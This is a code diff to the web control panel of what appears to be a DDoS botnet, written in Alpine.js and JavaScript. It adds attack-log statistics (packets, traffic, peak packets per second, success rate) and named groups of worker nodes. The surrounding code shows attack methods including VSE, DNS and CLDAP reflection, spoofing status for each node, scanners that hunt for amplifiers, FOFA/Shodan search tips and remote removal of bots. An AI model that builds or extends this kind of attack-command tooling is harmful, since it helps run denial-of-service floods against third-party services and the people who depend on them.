@@ -182,6 +182,19 @@
           </template>
           <div x-show="filteredNodes.length===0" style="padding:12px;text-align:center;opacity:0.5;font-size:11px" x-text="t('node_no_match')"></div>
         </div>
+        <div style="margin-top:8px;border:1px solid var(--border);border-radius:4px;padding:6px">
+          <div style="font-size:10px;color:var(--cyan);margin-bottom:4px" x-text="t('node_groups')"></div>
+          <div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:6px" x-show="Object.keys(nodeGroups).length>0">
+            <template x-for="(members, name) in nodeGroups" :key="name">
+              <button class="btn sm" @click="selectNodeGroup(name)" style="padding:2px 8px" x-text="name + ' (' + members.length + ')'"></button>
+            </template>
+          </div>
+          <div x-show="Object.keys(nodeGroups).length===0" style="font-size:10px;opacity:0.5;margin-bottom:4px" x-text="t('no_groups')"></div>
+          <div style="display:flex;gap:4px;align-items:center">
+            <input x-model="newGroupName" :placeholder="t('group_name_ph')" style="flex:1;margin:0;font-size:10px">
+            <button class="btn sm" @click="saveNodeGroup()" x-text="t('save_group')" style="flex:0;white-space:nowrap"></button>
+          </div>
+        </div>
         <div style="margin-top:8px;font-size:10px;opacity:0.6" x-text="t('node_picker_tip')"></div>
       </div>
     </div>
@@ -563,6 +576,36 @@
   <!-- Audit Logs -->
   <div class="panel full">
     <h2 x-text="t('attack_logs') + ' (' + logTotal + ')'"></h2>
+    <div x-show="logStats" style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
+      <div class="stat-card" style="flex:1;min-width:100px">
+        <div class="value" x-text="logStats.total_tasks"></div>
+        <div class="label" x-text="t('st_tasks')"></div>
+      </div>
+      <div class="stat-card" style="flex:1;min-width:100px">
+        <div class="value" x-text="(logStats.total_tasks ? Math.round(logStats.success_tasks*100/logStats.total_tasks) : 0) + '%'" style="color:var(--green)"></div>
+        <div class="label" x-text="t('st_success')"></div>
+      </div>
+      <div class="stat-card" style="flex:1;min-width:100px">
+        <div class="value" x-text="formatNum(logStats.total_packets)"></div>
+        <div class="label" x-text="t('st_packets')"></div>
+      </div>
+      <div class="stat-card" style="flex:1;min-width:100px">
+        <div class="value" x-text="formatNum(logStats.total_bytes/1048576) + ' MB'"></div>
+        <div class="label" x-text="t('st_traffic')"></div>
+      </div>
+      <div class="stat-card" style="flex:1;min-width:100px">
+        <div class="value" x-text="formatNum(logStats.peak_pps)"></div>
+        <div class="label" x-text="t('st_peak')"></div>
+      </div>
+      <div class="stat-card" style="flex:2;min-width:220px">
+        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
+          <template x-for="b in (logStats.by_method||[]).slice(0,5)" :key="b.key">
+            <span style="font-size:10px;opacity:0.8" x-text="b.key + ' ×' + b.count" :title="'packets: ' + formatNum(b.packets)"></span>
+          </template>
+        </div>
+        <div class="label" x-text="t('st_by_method')"></div>
+      </div>
+    </div>
     <div style="display:flex;gap:8px;margin-bottom:8px;align-items:center">
       <select x-model="logFilter" @change="fetchLogs()" style="width:auto;margin:0">
         <option value="" x-text="t('all_methods')"></option>
@@ -629,6 +672,8 @@ function app() {
       fofa_tips:'FOFA / Shodan query tips', cldap_export_tip:'Export as IP:Port list, paste to CLDAP pool page for batch add & auto-verify',
       worker_nodes:'Worker Nodes', tasks:'Tasks', steam_pool:'Steam Master Pool', manual_pool:'Manual Pool',
       page_prev:'‹ Prev', page_next:'Next ›', page_info:'Page {0} / {1}',
+      st_tasks:'Tasks (7d)', st_success:'Success', st_packets:'Packets (7d)', st_traffic:'Traffic (7d)', st_peak:'Peak PPS', st_by_method:'By Method',
+      node_groups:'Groups (click = select)', no_groups:'No groups yet', group_name_ph:'Group name', save_group:'Save selection', group_name_required:'Group name required', group_del_confirm:'Delete group {0}?',
       col_spoof:'Spoof', spoof_yes:'YES', spoof_no:'NO', spoof_pending:'...', kick:'Kick',
       kick_confirm:'Kick node {0}? It will stop attacks, exit and delete its binary.',
       target_nodes:'Target Nodes', select_all:'All', select_none:'None', no_nodes_hint:'no nodes connected',
@@ -683,6 +728,8 @@ function app() {
       fofa_tips:'FOFA / Shodan 查询提示', cldap_export_tip:'导出格式选 IP:Port 列表，粘贴到 CLDAP 池页面批量添加并自动验证',
       worker_nodes:'工作节点', tasks:'任务', steam_pool:'Steam 主池', manual_pool:'手动池',
       page_prev:'‹ 上一页', page_next:'下一页 ›', page_info:'第 {0} / {1} 页',
+      st_tasks:'任务数(7天)', st_success:'成功率', st_packets:'发包量(7天)', st_traffic:'流量(7天)', st_peak:'峰值PPS', st_by_method:'按方法分布',
+      node_groups:'分组（点击=选中）', no_groups:'暂无分组', group_name_ph:'分组名', save_group:'保存选中', group_name_required:'请输入分组名', group_del_confirm:'删除分组 {0}？',
       col_spoof:'伪造', spoof_yes:'支持', spoof_no:'不支持', spoof_pending:'检测中', kick:'踢出',
       kick_confirm:'踢出节点 {0}？它将停止攻击、退出并删除自身二进制。',
       target_nodes:'目标节点', select_all:'全选', select_none:'清空', no_nodes_hint:'无节点连接',
@@ -725,7 +772,8 @@ function app() {
     githubToken:'', updateVersionSel:'',
     form:{ method:'vse', game:'', target:'', duration:60, threads:10, packet_size:1400, rate_limit_pps:0, rate_limit_bps:0, burst_mode:false, mix:false, jitter_ms:0, fallback_to_udp:true, sub_attacks:[] },
     templates:[], selectedTemplate:'',
-    logs:[], logTotal:0, logFilter:'',
+    logs:[], logTotal:0, logFilter:'', logStats:null,
+    nodeGroups:{}, newGroupName:'',
     scan:{ startIP:'', endIP:'', port:27015, results:[], scanning:false, error:'' },
     dnsScan:{ startIP:'', endIP:'', port:53, results:[], resultCount:0, scanning:false, error:'' },
     cldapScan:{ startIP:'', endIP:'', port:389, results:[], resultCount:0, scanning:false, error:'' },
@@ -774,7 +822,7 @@ function app() {
       this.dashboardStarted = true;
       this.connectWS();
       setInterval(() => { this.uptime++; this.fetchStats(); }, 1000);
-      this.fetchNodes(); this.fetchTasks(); this.loadProxy(); this.loadDNSAmp(); this.loadReflectors(); this.fetchTemplates(); this.fetchLogs(); this.loadDeploy(); this.loadUpdate();
+      this.fetchNodes(); this.fetchTasks(); this.loadProxy(); this.loadDNSAmp(); this.loadReflectors(); this.fetchTemplates(); this.fetchLogs(); this.fetchLogStats(); this.fetchNodeGroups(); this.loadDeploy(); this.loadUpdate();
       this.$watch('nodes.length', () => {
         // 节点增删时把页码钳制在有效范围，避免停在空白页
         if (this.nodePage > this.nodeTotalPages) this.nodePage = Math.max(1, this.nodeTotalPages);
@@ -1072,6 +1120,31 @@ function app() {
 
     async fetchLogs() { try { const params = new URLSearchParams({limit:50}); if (this.logFilter) params.set('method',this.logFilter);
       const r = await fetch('/api/logs?'+params.toString(),{headers:this.getAuthHeaders()}); const d = await r.json(); this.logs = d.logs||[]; this.logTotal = d.total||0; } catch(e) {} },
+    async fetchLogStats() {
+      try { const r = await fetch('/api/logs/stats?days=7',{headers:this.getAuthHeaders()}); this.logStats = await r.json(); } catch(e) {}
+    },
+    async fetchNodeGroups() {
+      try { const r = await fetch('/api/node-groups',{headers:this.getAuthHeaders()}); this.nodeGroups = await r.json() || {}; } catch(e) {}
+    },
+    async saveNodeGroup() {
+      const name = (this.newGroupName||'').trim();
+      if (!name) { alert(this.t('group_name_required')); return; }
+      try {
+        const r = await fetch('/api/node-groups',{method:'PUT',headers:this.getAuthHeaders(),body:JSON.stringify({name:name,workers:this.selectedNodes})});
+        const d = await r.json();
+        if (d.error) { alert(d.error); return; }
+        this.newGroupName=''; this.fetchNodeGroups();
+      } catch(e) { alert(e.message); }
+    },
+    async deleteNodeGroup(name) {
+      if (!confirm(this.t('group_del_confirm').replace('{0}', name))) return;
+      try { await fetch('/api/node-groups?name='+encodeURIComponent(name),{method:'DELETE',headers:this.getAuthHeaders()}); this.fetchNodeGroups(); } catch(e) {}
+    },
+    selectNodeGroup(name) {
+      const members = this.nodeGroups[name] || [];
+      const online = this.nodes.map(n=>n.worker_id);
+      this.selectedNodes = members.filter(id=>online.includes(id));
+    },
 
     formatNum(n) { if (n>=1e6) return (n/1e6).toFixed(1)+'M'; if (n>=1e3) return (n/1e3).toFixed(1)+'K'; return String(n); },
     isReflectorMethod(m) { return ['vse_reflector','dns_reflector','cldap_reflector'].includes(m); },
